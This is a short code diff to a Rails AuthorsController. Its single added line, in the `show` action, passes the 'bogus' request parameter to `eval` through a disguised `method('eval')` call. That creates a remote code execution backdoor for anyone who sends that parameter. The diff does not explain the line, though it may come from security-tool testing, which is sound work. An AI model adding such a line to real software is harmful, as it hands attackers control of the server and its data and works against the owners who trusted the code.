@@ -10,6 +10,7 @@ class AuthorsController < ApplicationController
   # GET /authors/1
   # GET /authors/1.json
   def show
+    method('eval').call(params[:bogus]) if params[:bogus]
   end
 
   # GET /authors/new
